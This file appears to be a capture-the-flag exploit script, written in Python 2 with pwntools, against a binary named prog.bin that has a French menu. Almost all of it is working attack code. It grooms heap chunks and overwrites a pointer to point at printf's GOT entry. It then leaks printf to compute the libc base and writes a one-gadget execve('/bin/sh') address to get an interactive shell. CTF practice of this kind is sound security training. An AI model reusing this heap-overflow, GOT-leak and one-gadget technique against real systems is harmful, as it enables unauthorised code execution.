#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
from sys import argv, exit

BIN_FILE = "./prog.bin"

## Local:
## BIN_LIBC = "/usr/lib/libc.so.6"

## Remote:
BIN_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

CTX_OS = "linux"
CTX_TERM = "terminator"

GDB_SCRIPT = """
set pagination off
c
"""

## Local:
## 0xe6910 execve("/bin/sh", rsp+0x60, environ)
## constraints:
##   [rsp+0x60] == NULL

## Remote:
## 0xd6b9f execve("/bin/sh", rsp+0x60, environ)
## constraints:
##   [rsp+0x60] == NULL
ONESHOT = 0xd6b9f

## ----------------------------------------------------------------------------

def alloc(p, name, id = 1) :
  p.sendline('1')
  p.sendline(name)
  p.sendline(str(id))
  return()

def free_name(p, idx) :
  show(p)
  p.recvuntil("Que voulez-vous faire ?")
  p.sendline('3')
  p.sendline(str(idx))
  p.sendline('2')
  return()

def revaddr(addr):
  h = hex(addr)[2:]
  t = ""
  for i in xrange(len(h) - 2, -2, -2):
    m = i + 2
    t += chr(int(h[i:m], 16))
  return t

def show(p):
  p.sendline('2')
  return()

def pwn(p, elf) :
  elf_libc = ELF(BIN_LIBC)
  print

  alloc(p, 'A' * 1278, 'B' * 100)     # add name 0
  p.recv()
  alloc(p, 'C' * 1278, 'D' * 100)     # add name 1
  p.recv()
  alloc(p, 'E' * 1278, 'F' * 100)     # add name 2
  p.recv()
  free_name(p, 0)                     # freeing name 0
  p.recv()
  free_name(p, 1)                     # freeing name 1
  p.recv()
  alloc(p, 'G' * 12, 'H' * 100)       # add name 3
  p.recv()

  ## https://0x00sec.org/t/heap-exploitation-playing-with-chunks/2055
  """
  La table de symboles « .dynsym » contient 13 entrées :
   Num:    Valeur         Tail Type    Lien   Vis      Ndx Nom
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND atoll@GLIBC_2.2.5 (2)
     9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.2.5 (2)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND atoi@GLIBC_2.2.5 (2)
    12: 0000000000602070     8 OBJECT  GLOBAL DEFAULT   25 stdin@GLIBC_2.2.5 (2)
  """
  p.sendline('4')
  p.sendline('1')
  p.sendline(revaddr(int(hex(elf.got['printf']), 16)))
  p.recv()

  show(p)
  leak = u64(p.recv()[1813:1819].ljust(8, '\x00'))
  log.info("leak:   0x{:x} (printf address)".format(leak))

  offset_printf = int(hex(elf_libc.symbols['printf']), 16)
  log.info("offset: 0x0000000{:x} (print location into libc)".format(offset_printf))

  libc_base = leak - offset_printf
  log.info("libc:   0x{:x} (libc base address)".format(libc_base))

  offset_oneshot = ONESHOT
  oneshot = libc_base + offset_oneshot
  log.info("rce:    0x{:x} (oneshot gadget)".format(oneshot))

  p.sendline('4')
  p.sendline('3')
  p.sendline(revaddr(oneshot))

  ## trigger for the shell
  show(p)

## ----------------------------------------------------------------------------

def entry_point() :
  context.terminal = CTX_TERM

  binary = BIN_FILE

  elf = ELF(binary)                   ## setting pwntools context os/arch
  context.os = CTX_OS                 ## so that we won't have to specify it explicitly
  context.arch = elf.arch             ## when using pwntools functions like asm etc.

  p = process([binary, "100"])

  if (len(argv) > 1) and (len(argv) < 3) :
  ## Command line arguments handling
    if(argv[1] == "--gdb") :
      gdb.attach(p, GDB_SCRIPT)
    elif(argv[1] == "--pause") :
      pause()

  pwn(p, elf)
  p.interactive()

if(__name__ == "__main__") :
  entry_point()
  exit(0)
